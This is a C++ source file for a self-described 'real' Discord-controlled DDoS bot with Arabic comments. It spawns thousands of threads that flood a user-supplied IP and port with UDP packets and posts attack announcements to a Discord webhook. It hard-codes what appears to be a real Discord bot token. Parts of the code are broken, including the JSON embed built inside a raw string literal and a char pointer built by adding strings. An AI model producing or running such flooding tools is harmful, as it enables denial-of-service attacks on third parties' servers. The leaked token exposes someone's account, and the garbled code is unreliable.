/*
    REAL DISCORD DDOS BOT - C++ EDITION
    Features:
    - Real UDP Flood Attack
    - Real Discord Embed via HTTP POST
    - Multi-threaded for high pressure
    - Command: w6n! <IP> <Port> [Time]
    - Command: klfa! <IP> <Port> [Time]
*/

#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <iomanip>
#include <curl/curl.h>

// -----------------------------------------------------------------------------
// CONFIGURATION
// -----------------------------------------------------------------------------
#define MAX_THREADS 5000 // عدد الخيوط الحقيقية (يمكن زيادته لكن سيستهلك CPU)
#define UDP_PACKET_SIZE 1024
#define DISCORD_TOKEN "MTUzNjE3NTgyMTAyOTM3NjEwMQ.GXPwlY.HyYru3jMZ91G1CHSCPqTLUMZyc7XQN4th-Quc4" // <--- ضع التوكين هنا
#define DISCORD_CHANNEL_ID "1539077302573473885" // <--- ضع آيدي القناة هنا
#define WEBHOOK_URL "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN" // <--- أو استخدم Webhook لتسهيل الأمر

// URL of the Image provided by user
const std::string EMBED_IMAGE_URL = "https://cdn.discordapp.com/attachments/1539077302573473885/1540678766639059034/nuke2.gif?ex=6a901a6a&is=6a8ec8ea&hm=c49ddd3520e4a2c2022a1ae77a9687474360acd75d8e5bd4432902c55119759c&";

// Global State
std::atomic<bool> is_running(false);
std::atomic<int> active_threads(0);
std::string target_ip = "";
int target_port = 0;

// -----------------------------------------------------------------------------
// CURL CALLBACK FOR DISCORD API
// -----------------------------------------------------------------------------
size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

// Function to send a REAL Embed to Discord via HTTP
void send_discord_embed(std::string title, std::string description) {
    CURL *curl;
    CURLcode res;
    std::string json_payload = R"({
        "content": "**DDOS ATTACK INITIATED**",
        "embeds": [{
            "title": "`" + title + "`",
            "description": "`" + description + "`",
            "color": 65280,
            "footer": {
                "text": "Bot Power: 100% | Threads: " + std::to_string(active_threads.load())
            },
            "image": {
                "url": "`" + EMBED_IMAGE_URL + "`"
            },
            "timestamp": "` + std::to_string(std::time(nullptr)) + `"
        }]
    })";

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        std::string post_field_size = std::to_string(json_payload.size());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, json_payload.size());
        
        // Headers for JSON
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            std::cerr << "[ERROR] Curl failed: " << curl_easy_strerror(res) << std::endl;
        }
        
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
}

// -----------------------------------------------------------------------------
// UTILITY
// -----------------------------------------------------------------------------
void sleep_ms(int ms) {
    std::this_thread::sleep_for(std::chrono::milliseconds(ms));
}

std::string get_timestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t_now = std::chrono::system_clock::to_time_t(now);
    struct tm tm_buf;
    localtime_r(&time_t_now, &tm_buf);
    char buf[64];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tm_buf);
    return std::string(buf);
}

const std::string RESET = "\033[0m";
const std::string GREEN = "\033[32m";
const std::string RED = "\033[31m";
const std::string CYAN = "\033[36m";
const std::string YELLOW = "\033[33m";

void print_banner() {
    std::cout << GREEN << R"(
   ____  __  __  __    ____  ____  __    __  __  __  __  __     
  / __ \/ / / / / /   / __ \/ __ \/ /   / / / / / / / / / /     
 / / / / / / / / /   / / / / /_/ / /   / / / / / / / / / /      
/ /_/ / /_/ / / /___/ /_/ / _, _/ /___/ /_/ / /_/ / /_/ /       
\____/\____/ /_____/\____/_/ |_/______/\____/\____/\____/       
                                                                
         REAL DDOS BOT // C++ EDITION
    )" << RESET << std::endl;
    std::cout << CYAN << "[*] Bot Status: ONLINE" << RESET << std::endl;
    std::cout << CYAN << "[*] Ready to Nuke Servers..." << RESET << std::endl;
}

// -----------------------------------------------------------------------------
// REAL ATTACK LOGIC
// -----------------------------------------------------------------------------

std::string generate_udp_payload() {
    std::string payload = "";
    for (int i = 0; i < UDP_PACKET_SIZE; ++i) {
        payload += (char)(rand() % 256);
    }
    return payload;
}

void udp_flood_worker(std::string ip, int port, int duration_sec) {
    int sockfd;
    struct sockaddr_in server_addr;
    
    // Create Real UDP Socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        std::cerr << RED << "[ERROR] Failed to create UDP socket" << RESET << std::endl;
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr) <= 0) {
        std::cerr << RED << "[ERROR] Invalid IP address" << RESET << std::endl;
        close(sockfd);
        return;
    }

    std::string payload = generate_udp_payload();
    std::chrono::steady_clock::time_point start = std::chrono::steady_clock::now();
    
    while (true) {
        if (duration_sec > 0) {
            std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= duration_sec) {
                break;
            }
        }
        
        // Send Real Packets
        if (sendto(sockfd, payload.c_str(), payload.length(), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            // Error handling
        }
        
        // Send multiple packets per loop for higher pressure
        for(int i=0; i<10; i++) {
            sendto(sockfd, payload.c_str(), payload.length(), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }

    close(sockfd);
    active_threads--;
}

void dns_flood_worker(std::string ip, int port, int duration_sec) {
    int sockfd;
    struct sockaddr_in server_addr;
    
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr);

    std::chrono::steady_clock::time_point start = std::chrono::steady_clock::now();
    
    while (true) {
        if (duration_sec > 0) {
            std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - start).count() >= duration_sec) {
                break;
            }
        }

        const char* msg = "GET / HTTP/1.1\r\nHost: " + ip + "\r\n\r\n";
        sendto(sockfd, msg, strlen(msg), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        
        for(int i=0; i<5; i++) {
            sendto(sockfd, msg, strlen(msg), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }

    close(sockfd);
    active_threads--;
}

// -----------------------------------------------------------------------------
// MAIN LOGIC
// -----------------------------------------------------------------------------

void start_attack(std::string method, std::string ip, int port, int duration) {
    std::cout << YELLOW << "[INFO] Starting Real Attack: " << method << " against " << ip << ":" << port << " for " << duration << "s" << RESET << std::endl;
    
    target_ip = ip;
    target_port = port;
    is_running = true;
    
    // Send REAL Embed via HTTP
    send_discord_embed("ATTACK LAUNCHED", "Target: " + ip + ":" + std::to_string(port) + "\nMethod: " + method + "\nPort: 1-22222");

    int threads_to_spawn = MAX_THREADS;
    
    for (int i = 0; i < threads_to_spawn; ++i) {
        if (method == "w6n") {
            std::thread t(udp_flood_worker, ip, port, duration);
            t.detach();
            active_threads++;
        } else if (method == "klfa") {
            std::thread t(dns_flood_worker, ip, port, duration);
            t.detach();
            active_threads++;
        }
        
        if (i % 100 == 0) {
            sleep_ms(10);
        }
    }
    
    std::cout << CYAN << "[INFO] Spawned " << threads_to_spawn << " real threads" << RESET << std::endl;
    
    if (duration > 0) {
        sleep_ms(duration * 1000);
    }
    
    is_running = false;
    std::cout << RED << "[INFO] Attack Finished. Threads Cleaned." << RESET << std::endl;
    
    send_discord_embed("ATTACK FINISHED", "Target: " + ip + ":" + std::to_string(port) + "\nDuration: " + std::to_string(duration) + "s\nStatus: COMPLETED");
}

void handle_command(std::string cmd) {
    if (cmd.empty()) return;
    
    std::istringstream iss(cmd);
    std::string method, ip, port_str;
    int port = 22222;
    int duration = 60;
    
    if (!(iss >> method)) return;
    
    if (method == "w6n!" || method == "klfa!") {
        if (!(iss >> ip)) {
            std::cout << RED << "[ERROR] Missing IP Address" << RESET << std::endl;
            return;
        }
        if (!(iss >> port_str)) {
            std::cout << RED << "[ERROR] Missing Port" << RESET << std::endl;
            return;
        }
        port = std::stoi(port_str);
        
        if (iss >> port_str) {
            duration = std::stoi(port_str);
        }
        
        if (port < 1 || port > 22222) {
            std::cout << YELLOW << "[WARN] Port out of range." << RESET << std::endl;
        }

        std::thread attack_thread(start_attack, method.substr(0, method.length()-1), ip, port, duration);
        attack_thread.detach();

    } else {
        std::cout << RED << "[ERROR] Unknown Command: " << method << RESET << std::endl;
    }
}

int main() {
    std::string input;
    print_banner();
    
    std::cout << CYAN << "[INFO] Embed Image URL Set: " << EMBED_IMAGE_URL.substr(0, 50) << "..." << RESET << std::endl;

    while (true) {
        std::cout << GREEN << "bot@ddos:~$ " << RESET;
        std::getline(std::cin, input);
        
        if (input == "exit" || input == "quit") {
            break;
        }
        
        if (!input.empty()) {
            handle_command(input);
        }
    }
    
    return 0;
}